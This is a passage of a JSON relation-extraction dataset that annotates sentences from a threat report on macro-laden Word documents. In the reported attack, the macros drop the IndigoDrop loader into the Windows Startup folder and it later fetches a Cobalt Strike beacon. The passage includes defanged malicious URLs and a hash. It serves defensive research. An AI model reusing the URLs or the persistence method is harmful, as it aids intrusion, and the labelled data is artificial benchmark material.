35}]}, {"title": "643-9", "sents": [["Talos", "also", "found", "a", "benign", "copy", "of", "one", "of", "the", "maldocs", "indicating", "that", "it", "is", "highly", "likely", "that", "the", "attackers", "weaponized", "and", "distributed", "it", "to", "targets", "(", "Benign", "copy", "hash", ":", "0d16b15972d3d0f8a1481db4e2413a2c519e8ac49cd2bf3fca02cfa3ff0be532", ")", "."], ["Malicious", "VBA", "AnalysisThis", "section", "consists", "of", "an", "analysis", "of", "malicious", "macros", "used", "to", "carry", "out", "the", "attacks", "using", ":", "Locally", "embedded", "malicious", "macros", "andMalicious", "macros", "embedded", "in", "the", "injected", "templates", "downloaded", "from", "a", "remote", "location", "."], ["The", "malicious", "macros", "carry", "out", "the", "following", "malicious", "activities", ":", "Parse", "a", "Windows", "executable", "'", "s", "hardcoded", "bytes", "into", "bytes", "that", "can", "be", "written", "to", "a", "file", "on", "disk", "."], ["The", "parsed", "bytes", "are", "written", "to", "an", "EXE", "file", "in", "the", "currently", "logged", "in", "user", "'", "s", "Startup", "directory", ":", "E.", "g.", "%", "userprofile", "%", "\\AppData\\Roaming\\Microsoft\\Windows\\Start", "Menu\\Programs\\Startup\\anything.exeOnce", "the", "malicious", "EXE", "(", "second-stage", "payload", "IndigoDrop", ")", "has", "been", "written", "to", "the", "user", "'", "s", "Startup", "directory", "the", "macro", "quits", "execution", "without", "executing", "the", "actual", "second-stage", "payload", "."], ["The", "attack", "relies", "on", "the", "user", "either", "logging", "in", "again", "or", "restarting", "the", "system", "to", "activate", "the", "second-stage", "payload", "on", "the", "infected", "endpoint", "."], ["The", "second-stage", "payload", "in", "this", "attack", "is", "a", "custom", "dropper", "(", "IndigoDrop", ")", "that", "carries", "out", "a", "variety", "of", "tasks", "."], ["Malicious", "macro", "code", ":", "Maldoc", "distributionOne", "of", "the", "maldocs", "disclosed", "here", "was", "referred", "to", "by", "a", "Bit.ly-shortened", "URL", "(", "created", "Jan.", "23", ",", "2020", ")", "hxxp", ":", "//bit.ly/iaf-guidelines", "which", "redirects", "to", "hxxp", ":", "//tecbeck.com/IAP39031.docx.It", "is", "highly", "likely", "that", "the", "attackers", "hosted", "the", "maldocs", "on", "a", "public", "server", "and", "distributed", "the", "direct", "or", "Bit.ly", "links", "to", "the", "targets", "in", "the", "form", "of", "spear-phishing", "emails", "."], ["Stage", "2", ":", "Dropper", "binary", "IndigoDropThe", "second-stage", "binary", "dropped", "to", "disk", "by", "the", "maldocs", "is", "a", "malicious", "dropper/loader", "we", "'", "re", "calling", "``", "IndigoDrop", "''", "designed", "to", "download", "and", "activate", "a", "customized", "Cobalt", "Strike", "beacon", "(", "final", "payload", "DLL", ")", "from", "another", "remote", "location", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [10, 10], "name": "maldocs", "pos": [10, 11], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [19, 19], "name": "attackers", "pos": [19, 20], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [25, 25], "name": "targets", "pos": [25, 26], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [44, 44], "name": "macros", "pos": [10, 11], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [50, 50], "name": "attacks", "pos": [16, 17], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [56, 56], "name": "macros", "pos": [22, 23], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [67, 67], "name": "remote location", "pos": [33, 35], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [72, 72], "name": "macros", "pos": [2, 3], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [83, 83], "name": "executable", "pos": [13, 14], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [96, 96], "name": "file", "pos": [26, 27], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [107, 107], "name": "EXE file", "pos": [7, 9], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [117, 117], "name": "Startup directory", "pos": [17, 19], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [132, 132], "name": "payload IndigoDrop", "pos": [32, 34], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [143, 143], "name": "Startup directory", "pos": [43, 45], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [146, 146], "name": "macro", "pos": [46, 47], "index": "14_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [154, 154], "name": "payload", "pos": [54, 55], "index": "15_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [157, 157], "name": "attack", "pos": [1, 2], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [174, 174], "name": "payload", "pos": [18, 19], "index": "17_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [178, 178], "name": "endpoint", "pos": [22, 23], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [182, 182], "name": "payload", "pos": [2, 3], "index": "19_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [189, 189], "name": "dropper", "pos": [9, 10], "index": "20_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [199, 199], "name": "tasks", "pos": [19, 20], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [202, 202], "name": "macro code", "pos": [1, 3], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [209, 209], "name": "maldocs", "pos": [8, 9], "index": "23_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [218, 218], "name": "URL", "pos": [17, 18], "index": "24_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [232, 232], "name": "hxxp : //tecbeck.com/IAP39031.docx.It", "pos": [31, 34], "index": "25_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [240, 240], "name": "attackers", "pos": [39, 40], "index": "26_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [243, 243], "name": "maldocs", "pos": [42, 43], "index": "27_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [247, 247], "name": "server", "pos": [46, 47], "index": "28_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [253, 253], "name": "Bit.ly links", "pos": [52, 54], "index": "29_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [263, 263], "name": "emails", "pos": [62, 63], "index": "30_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [272, 272], "name": "binary", "pos": [7, 8], "index": "31_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [278, 278], "name": "maldocs", "pos": [13, 14], "index": "32_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [288, 288], "name": "IndigoDrop", "pos": [23, 24], "index": "33_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [297, 297], "name": "Cobalt Strike beacon", "pos": [32, 35], "index": "34_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [308, 308], "name": "location", "pos": [43, 44], "index": "35_0"}]], "labels": [{"r": "RD", "evidence": [0], "t": 0, "h": 1}, {"r": "ST", "evidence": [0], "h": 1, "t": 2}, {"r": "RF", "evidence": [0], "h": 1, "t": 2}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5, 6], "h": 1, "t": 26}, {"r": "RD", "evidence": [1], "t": 3, "h": 4}, {"r": "RD", "evidence": [1], "h": 4, "t": 5}, {"r": "ST", "evidence": [1], "h": 4, "t": 6}, {"r": "RF", "evidence": [1], "h": 4, "t": 6}, {"r": "RD", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [2], "h": 7, "t": 9}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 14}, {"r": "WR", "evidence": [3], "t": 12, "h": 14}, {"r": "EX", "evidence": [3], "h": 14, "t": 15}, {"r": "CO", "evidence": [3], "h": 10, "t": 11}, {"r": "CO", "evidence": [3], "h": 12, "t": 13}, {"r": "EX", "evidence": [4], "h": 16, "t": 17}, {"r": "ST", "evidence": [4], "h": 16, "t": 18}, {"r": "RF", "evidence": [4], "h": 16, "t": 18}, {"r": "CO", "evidence": [4, 5], "h": 17, "t": 19}, {"r": "EX", "evidence": [5], "t": 19, "h": 20}, {"r": "FR", "evidence": [5], "h": 20, "t": 21}, {"r": "EX", "evidence": [6], "t": 22, "h": 23}, {"r": "ST", "evidence": [6], "h": 23, "t": 24}, {"r": "RF", "evidence": [6], "h": 23, "t": 24}, {"r": "ST", "evidence": [6], "h": 23, "t": 25}, {"r": "RF", "evidence": [6], "h": 23, "t": 25}, {"r": "FR", "evidence": [6], "h": 26, "t": 27}, {"r": "ST", "evidence": [6], "h": 26, "t": 28}, {"r": "RF", "evidence": [6], "h": 26, "t": 28}, {"r": "ST", "evidence": [6], "h": 26, "t": 29}, {"r": "RF", "evidence": [6], "h": 26, "t": 29}, {"r": "WR", "evidence": [6], "h": 26, "t": 30}, {"r": "WR", "evidence": [7], "t": 31, "h": 32}, {"r": "EX", "evidence": [7], "t": 31, "h": 33}, {"r": "WR", "evidence": [7], "h": 33, "t": 34}, {"r": "EX", "evidence": [7], "h": 33, "t": 34}, {"r": "ST", "evidence": [7], "h": 33, "t": 35}, {"r": "RF", "evidence": [7], "h": 33, "t": 35}]}, {"title": "643-10", "sents": [["Malicious", "VBA", "AnalysisThis", "section", "consists", "of", "an", "analysis", "of", "malicious", "macros", "used", "to", "carry", "out", "the", "attacks", "using", ":", "Locally", "embedded", "malicious", "macros", "andMalicious", "macros", "embedded", "in", "the", "injected", "templates", "downloaded", "from", "a", "remote", "location", "."], ["The", "malicious", "macros", "carry", "out", "the", "following", "malicious", "activities", ":", "Parse", "a", "Windows", "executable", "'", "s", "hardcoded", "bytes", "into", "bytes", "that", "can", "be", "written", "to", "a", "file", "on", "disk", "."], ["The", "parsed", "bytes", "are", "written", "to", "an", "EXE", "file", "in", "the", "currently", "logged", "in", "user", "'", "s", "Startup", "directory", ":", "E.", "g.", "%", "userprofile", "%", "\\AppData\\Roaming\\Microsoft\\Windows\\Start", "Menu\\Programs\\Startup\\anything.exeOnce", "the", "malicious", "EXE", "(", "second-stage", "payload", "IndigoDrop", ")", "has", "been", "written", "to", "the", "user", "'", "s", "Startup", "directory", "the", "macro", "quits", "execution", "without", "executing", "the", "actual", "second-stage", "payload", "."], ["The", "attack", "relies", "on", "the", "user", "either", "logging", "in", "again", "or", "restarting", "the", "system", "to", "activate", "the", "second-stage", "payload", "on", "the", "infected", "endpoint", "."], ["The", "second-stage", "payload", "in", "this", "attack", "is", "a", "custom", "dropper", "(", "IndigoDrop", ")", "that", "carries", "out", "a", "variety", "of", "tasks", "."], ["Malicious", "macro", "code", ":", "Maldoc", "distributionOne", "of", "the", "maldocs", "disclosed", "here", "was", "referred", "to", "by", "a", "Bit.ly-shortened", "URL", "(", "created", "Jan.", "23", ",", "2020", ")", "hxxp", ":", "//bit.ly/iaf-guidelines", "which", "redirects", "to", "hxxp", ":", "//tecbeck.com/IAP39031.docx.It", "is", "highly", "likely", "that", "the", "attackers", "hosted", "the", "maldocs", "on", "a", "public", "server", "and", "distributed", "the", "direct", "or", "Bit.ly", "links", "to", "the", "targets", "in", "the", "form", "of", "spear-phishing", "emails", "."], ["Stage", "2", ":", "Dropper", "binary", "IndigoDropThe", "second-stage", "binary", "dropped", "to", "disk", "by", "the", "maldocs", "is", "a", "malicious", "dropper/loader", "we", "'", "re", "calling", "``", "IndigoDrop", "''", "designed", "to", "download", "and", "activate", "a", "customized", "Cobalt", "Strike", "beacon", "(", "final", "payload", "DLL", ")", "from", "another", "remote", "location", "."], ["In", "this", "attack", ",", "IndigoDrop", "utilizes", "both", "attacker-operated", "remote", "locations", "and", "public", "data", "hosting", "platforms", "such", "as", "pastebin.com", "to", "host", "the", "next", "stage", "payloads", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "macros", "pos": [10, 11], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [16, 16], "name": "attacks", "pos": [16, 17], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [22, 22], "name": "macros", "pos": [22, 23], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [33, 33], "name": "remote location", "pos": [33, 35], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [38, 38], "name": "macros", "pos": [2, 3], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [49, 49], "name": "executable", "pos": [13, 14], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [62, 62], "name": "file", "pos": [26, 27], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [73, 73], "name": "EXE file", "pos": [7, 9], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [83, 83], "name": "Startup directory", "pos": [17, 19], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [98, 98], "name": "payload IndigoDrop", "pos": [32, 34], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [109, 109], "name": "Startup directory", "pos": [43, 45], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [112, 112], "name": "macro", "pos": [46, 47], "index": "11_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [120, 120], "name": "payload", "pos": [54, 55], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [123, 123], "name": "attack", "pos": [1, 2], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [140, 140], "name": "payload", "pos": [18, 19], "index": "14_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [144, 144], "name": "endpoint", "pos": [22, 23], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [148, 148], "name": "payload", "pos": [2, 3], "index": "16_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [155, 155], "name": "dropper", "pos": [9, 10], "index": "17_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [165, 165], "name": "tasks", "pos": [19, 20], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [168, 168], "name": "macro code", "pos": [1, 3], "index": "19_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [175, 175], "name": "maldocs", "pos": [8, 9], "index": "20_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [184, 184], "name": "URL", "pos": [17, 18], "index": "21_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [198, 198], "name": "hxxp : //tecbeck.com/IAP39031.docx.It", "pos": [31, 34], "index": "22_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [206, 206], "name": "attackers", "pos": [39, 40], "index": "23_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [209, 209], "name": "maldocs", "pos": [42, 43], "index": "24_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [213, 213], "name": "server", "pos": [46, 47], "index": "25_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [219, 219], "name": "Bit.ly links", "pos": [52, 54], "index": "26_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [229, 229], "name": "emails", "pos": [62, 63], "index": "27_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [238, 238], "name": "binary", "pos": [7, 8], "index": "28_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [244, 244], "name": "maldocs", "pos": [13, 14], "index": "29_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [254, 254], "name": "IndigoDrop", "pos": [23, 24], "index": "30_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [263, 263], "name": "Cobalt Strike beacon", "pos": [32, 35], "index": "31_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [274, 274], "name": "location", "pos": [43, 44], "index": "32_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [278, 278], "name": "attack", "pos": [2, 3], "index": "33_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [280, 280], "name": "IndigoDrop", "pos": [4, 5], "index": "34_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [284, 284], "name": "remote locations", "pos": [8, 10], "index": "35_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [290, 290], "name": "platforms", "pos": [14, 15], "index": "36_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [299, 299], "name": "payloads", "pos": [23, 24], "index": "37_0"}]], "labels": [{"r": "RD", "evidence": [0], "t": 0, "h": 1}, {"r": "RD", "evidence": [0], "h": 1, "t": 2}, {"r": "ST", "evidence": [0], "h": 1, "t": 3}, {"r": "RF", "evidence": [0], "h": 1, "t": 3}, {"r": "RD", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [1], "h": 4, "t": 6}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 11}, {"r": "WR", "evidence": [2], "t": 9, "h": 11}, {"r": "EX", "evidence": [2], "h": 11, "t": 12}, {"r": "CO", "evidence": [2], "h": 7, "t": 8}, {"r": "CO", "evidence": [2], "h": 9, "t": 10}, {"r": "EX", "evidence": [3], "h": 13, "t": 14}, {"r": "ST", "evidence": [3], "h": 13, "t": 15}, {"r": "RF", "evidence": [3], "h": 13, "t": 15}, {"r": "CO", "evidence": [3, 4], "h": 14, "t": 16}, {"r": "EX", "evidence": [4], "t": 16, "h": 17}, {"r": "FR", "evidence": [4], "h": 17, "t": 18}, {"r": "EX", "evidence": [5], "t": 19, "h": 20}, {"r": "ST", "evidence": [5], "h": 20, "t": 21}, {"r": "RF", "evidence": [5], "h": 20, "t": 21}, {"r": "ST", "evidence": [5], "h": 20, "t": 22}, {"r": "RF", "evidence": [5], "h": 20, "t": 22}, {"r": "FR", "evidence": [5], "h": 23, "t": 24}, {"r": "ST", "evidence": [5], "h": 23, "t": 25}, {"r": "RF", "evidence": [5], "h": 23, "t": 25}, {"r": "ST", "evidence": [5], "h": 23, "t": 26}, {"r": "RF", "evidence": [5], "h": 23, "t": 26}, {"r": "WR", "evidence": [5], "h": 23, "t": 27}, {"r": "WR", "evidence": [6], "t": 28, "h": 29}, {"r": "EX", "evidence": [6], "t": 28, "h": 30}, {"r": "WR", "evidence": [6], "h": 30, "t": 31}, {"r": "EX", "evidence": [6], "h": 30, "t": 31}, {"r": "ST", "evidence": [6], "h": 30, "t": 32}, {"r": "RF", "evidence": [6], "h": 30, "t": 32}, {"r": "FR", "evidence": [7], "h": 33, "t": 34}, {"r": "ST", "evidence": [7], "h": 34, "t": 35}, {"r": "RF", "evidence": [7], "h": 34, "t": 35}, {"r": "ST", "evidence": [7], "h": 34, "t": 36}, {"r": "RF", "evidence": [7], "h": 34, "t": 36}, {"r": "WR", "evidence": [7], "h": 34, "t": 37}]}, {"title": "643-11", "sents": [["The", "malicious", "macros", "carry", "out", "the", "following", "malicious", "activities", ":", "Parse", "a", "Windows", "executable", "'", "s", "hardcoded", "bytes", "into", "bytes", "that", "can", "be", "written", "to", "a", "file", "on", "disk", "."], ["The", "parsed", "bytes", "are", "written", "to", "an", "EXE", "file", "in", "the", "currently", "logged", "in", "user", "'", "s", "Startup", "directory", ":", "E.", "g.", "%", "userprofile", "%", "\\AppData\\Roaming\\Microsoft\\Windows\\Start", "Menu\\Programs\\Startup\\anything.exeOnce", "the", "malicious", "EXE", "(", "second-stage", "payload", "IndigoDrop", ")", "has", "been", "written", "to", "the", "user", "'", "s", "Startup", "directory", "the", "macro", "quits", "execution", "without", "executing", "the", "actual", "second-stage", "payload", "."], ["The", "attack", "relies", "on", "the", "user", "either", "logging", "in", "again", "or", "restarting", "the", "system", "to", "activate", "the", "second-stage", "payload", "on", "the", "infected", "endpoint", "."], ["The", "second-stage", "payload", "in", "this", "attack", "is", "a", "custom", "dropper", "(", "IndigoDrop", ")", "that", "carries", "out", "a", "variety", "of", "tasks", "."], ["Malicious", "macro", "code", ":", "Maldoc", "distributionOne", "of", "the", "maldocs", "disclosed", "here", "was", "referred", "to", "by", "a", "Bit.ly-shortened", "URL", "(", "created", "Jan.", "23", ",", "2020", ")", "hxxp", ":", "//bit.ly/iaf-guidelines", "which", "redirects", "to", "hxxp", ":", "//tecbeck.com/IAP39031.docx.It", "is", "highly", "likely", "that", "the", "attackers", "hosted", "the", "maldocs", "on", "a", "public", "server", "and", "distributed", "the", "direct", "or", "Bit.ly", "links", "to", "the", "targets", "in", "the", "form", "of", "spear-phishing", "emails", "."], ["Stage", "2", ":", "Dropper", "binary", "IndigoDropThe", "second-stage", "binary", "dropped", "to", "disk", "by", "the", "maldocs", "is", "a", "malicious", "dropper/loader", "we", "'", "re", "calling", "``", "IndigoDrop", "''", "designed", "to", "download", "and", "activate", "a", "customized", "Cobalt", "Strike", "beacon", "(", "final", "payload", "DLL", ")", "from", "another", "remote", "location", "."], ["In", "this", "attack", ",", "IndigoDrop", "utilizes", "both", "attacker-operated", "remote", "locations", "and", "public", "data", "hosting", "platforms", "such", "as", "pastebin.com", "to", "host", "the", "next", "stage", "payloads", "."], ["It", "is", "highly", "likely", "that", "this", "dropper", "may", "download", "the", "final", "payload", "from", "these", "remote", "locations", "(", "likely", "done", "in", "other", "variants", "of", "the", "attack", ")", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "macros", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "executable", "pos": [13, 14], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [26, 26], "name": "file", "pos": [26, 27], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [37, 37], "name": "EXE file", "pos": [7, 9], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [47, 47], "name": "Startup directory", "pos": [17, 19], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [62, 62], "name": "payload IndigoDrop", "pos": [32, 34], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [73, 73], "name": "Startup directory", "pos": [43, 45], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [76, 76], "name": "macro", "pos": [46, 47], "index": "7_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [84, 84], "name": "payload", "pos": [54, 55], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [87, 87], "name": "attack", "pos": [1, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [104, 104], "name": "payload", "pos": [18, 19], "index": "10_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [108, 108], "name": "endpoint", "pos": [22, 23], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [112, 112], "name": "payload", "pos": [2, 3], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [119, 119], "name": "dropper", "pos": [9, 10], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [129, 129], "name": "tasks", "pos": [19, 20], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [132, 132], "name": "macro code", "pos": [1, 3], "index": "15_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [139, 139], "name": "maldocs", "pos": [8, 9], "index": "16_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [148, 148], "name": "URL", "pos": [17, 18], "index": "17_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [162, 162], "name": "hxxp : //tecbeck.com/IAP39031.docx.It", "pos": [31, 34], "index": "18_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [170, 170], "name": "attackers", "pos": [39, 40], "index": "19_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [173, 173], "name": "maldocs", "pos": [42, 43], "index": "20_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [177, 177], "name": "server", "pos": [46, 47], "index": "21_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [183, 183], "name": "Bit.ly links", "pos": [52, 54], "index": "22_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [193, 193], "name": "emails", "pos": [62, 63], "index": "23_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [202, 202], "name": "binary", "pos": [7, 8], "index": "24_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [208, 208], "name": "maldocs", "pos": [13, 14], "index": "25_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [218, 218], "name": "IndigoDrop", "pos": [23, 24], "index": "26_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [227, 227], "name": "Cobalt Strike beacon", "pos": [32, 35], "index": "27_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [238, 238], "name": "location", "pos": [43, 44], "index": "28_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [242, 242], "name": "attack", "pos": [2, 3], "index": "29_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [244, 244], "name": "IndigoDrop", "pos": [4, 5], "index": "30_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [248, 248], "name": "remote locations", "pos": [8, 10], "index": "31_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [254, 254], "name": "platforms", "pos": [14, 15], "index": "32_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [263, 263], "name": "payloads", "pos": [23, 24], "index": "33_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [271, 271], "name": "dropper", "pos": [6, 7], "index": "34_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [276, 276], "name": "payload", "pos": [11, 12], "index": "35_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [279, 279], "name": "remote locations", "pos": [14, 16], "index": "36_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 7}, {"r": "WR", "evidence": [1], "t": 5, "h": 7}, {"r": "EX", "evidence": [1], "h": 7, "t": 8}, {"r": "CO", "evidence": [1], "h": 3, "t": 4}, {"r": "CO", "evidence": [1], "h": 5, "t": 6}, {"r": "EX", "evidence": [2], "h": 9, "t": 10}, {"r": "ST", "evidence": [2], "h": 9, "t": 11}, {"r": "RF", "evidence": [2], "h": 9, "t": 11}, {"r": "CO", "evidence": [2, 3], "h": 10, "t": 12}, {"r": "EX", "evidence": [3], "t": 12, "h": 13}, {"r": "FR", "evidence": [3], "h": 13, "t": 14}, {"r": "EX", "evidence": [4], "t": 15, "h": 16}, {"r": "ST", "evidence": [4], "h": 16, "t": 17}, {"r": "RF", "evidence": [4], "h": 16, "t": 17}, {"r": "ST", "evidence": [4], "h": 16, "t": 18}, {"r": "RF", "evidence": [4], "h": 16, "t": 18}, {"r": "FR", "evidence": [4], "h": 19, "t": 20}, {"r": "ST", "evidence": [4], "h": 19, "t": 21}, {"r": "RF", "evidence": [4], "h": 19, "t": 21}, {"r": "ST", "evidence": [4], "h": 19, "t": 22}, {"r": "RF", "evidence": [4], "h": 19, "t": 22}, {"r": "WR", "evidence": [4], "h": 19, "t": 23}, {"r": "WR", "evidence": [5], "t": 24, "h": 25}, {"r": "EX", "evidence": [5], "t": 24, "h": 26}, {"r": "WR", "evidence": [5], "h": 26, "t": 27}, {"r": "EX", "evidence": [5], "h": 26, "t": 27}, {"r": "ST", "evidence": [5], "h": 26, "t": 28}, {"r": "RF", "evidence": [5], "h": 26, "t": 28}, {"r": "FR", "evidence": [6], "h": 29, "t": 30}, {"r": "ST", "evidence": [6], "h": 30, "t": 31}, {"r": "RF", "evidence": [6], "h": 30, "t": 31}, {"r": "ST", "evidence": [6], "h": 30, "t": 32}, {"r": "RF", "evidence": [6], "h": 30, "t": 32}, {"r": "WR", "evidence": [6], "h": 30, "t": 33}, {"r": "CO", "evidence": [6, 7], "h": 30, "t": 34}, {"r": "WR", "evidence": [7], "h": 34, "t": 35}, {"r": "ST", "evidence": [7], "h": 34, "t": 36}, {"r": "RF", "evidence": [7], "h": 34, "t": 36}]}, {"title": "643-12", "sents": [["The", "parsed", "bytes", "are", "written", "to", "an", "EXE", "file", "in", "the", "currently", "logged", "in", "user", "'", "s", "Startup", "directory", ":", "E.", "g.", "%", "userprofile", "%", "\\AppData\\Roaming\\Microsoft\\Windows\\Start", "Menu\\Programs\\Startup\\anything.exeOnce", "the", "malicious", "EXE", "(", "second-stage", "payload", "IndigoDrop", ")", "has", "been", "written", "to", "the", "user", "'", "s", "Startup", "directory", "the", "macro", "quits", "execution", "without", "executing", "the", "actual", "second-stage", "payload", "."], ["The", "attack", "relies", "on", "the", "user", "either", "logging", "in", "again", "or", "restarting", "the", "system", "to", "activate", "the", "second-stage", "payload", "on", "the", "infected", "endpoint", "."], ["The", "second-stage", "payload", "in", "this", "attack", "is", "a", "custom", "dropper", "(", "IndigoDrop", ")", "that", "carries", "out", "a", "variety", "of", "tasks", "."], ["Malicious", "macro", "code", ":", "Maldoc", "distributionOne", "of", "the", "maldocs", "disclosed", "here", "was", "referred", "to", "by", "a", "Bit.ly-shortened", "URL", "(", "created", "Jan.", "23", ",", "2020", ")", "hxxp", ":", "//bit.ly/iaf-guidelines", "which", "redirects", "to", "hxxp", ":", "//tecbeck.com/IAP39031.docx.It", "is", "highly", "likely", "that", "the", "attackers", "hosted", "the", "maldocs", "on", "a", "public", "server", "and", "distributed", "the", "direct", "or", "Bit.ly", "links", "to", "the", "targets", "in", "the", "form", "of", "spear-phishing", "emails", "."], ["Stage", "2", ":", "Dropper", "binary", "IndigoDropThe", "second-stage", "binary", "dropped", "to", "disk", "by", "the", "maldocs", "is", "a", "malicious", "dropper/loader", "we", "'", "re", "calling", "``", "IndigoDrop", "''", "designed", "to", "download", "and", "activate", "a", "customized", "Cobalt", "Strike", "beacon", "(", "final", "payload", "DLL", ")", "from", "another", "remote", "location", "."], ["In", "this", "attack", ",", "IndigoDrop", "utilizes", "both", "attacker-operated", "remote", "locations", "and", "public", "data", "hosting", "platforms", "such", "as", "pastebin.com", "to", "host", "the", "next", "stage", "payloads", "."], ["It", "is", "highly", "likely", "that", "this", "dropper", "may", "download", "the", "final", "payload", 